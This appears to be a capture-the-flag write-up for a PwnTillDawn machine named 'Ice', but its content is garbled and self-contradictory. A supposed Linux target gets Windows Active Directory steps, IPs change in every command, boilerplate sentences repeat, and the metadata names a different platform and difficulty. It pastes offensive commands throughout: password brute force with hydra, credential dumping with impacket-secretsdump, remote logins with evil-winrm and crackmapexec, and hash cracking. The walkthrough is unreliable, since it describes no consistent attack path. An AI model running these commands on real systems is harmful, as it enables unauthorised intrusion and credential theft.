---
TitleSEO: "PwnTillDawn — Ice (Hard Linux) | ZureFX"
TitlePost: "PwnTillDawn — Ice (Hard Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Ice. SQL Injection and Broken Access Control to achieve hard compromise on Linux."
Keywords: "forensics, tryhackme, windows, insane"
URL: "https://zurefx.github.io/writeups/htb-ice-774.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-ice-774/"
Date: "2025-06-24"
Tags: "Forensics, TryHackMe, Windows, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-ice-774"
Permalink: "/writeups/htb-ice-774.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Ice** is rated **Hard** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.109.242.60`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.10.142.183/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.12.195.202
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.231.126 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.109.153.180/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
evil-winrm -i 10.115.177.82 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.83.54.2 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.247.220 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.224.82
```

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

Key finding: **Constrained Delegation**.

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.33.105.183 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.22.54.72
```

### Exploitation

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.124.208.15 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.39.204.126/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `smbclient`
- `smbexec`
- `mimikatz`
- `ligolo-ng`
- `netcat`
- `wpscan`
- `burpsuite`
- `rubeus`

### Key Takeaways

- SQL Injection
- Broken Access Control
- Constrained Delegation
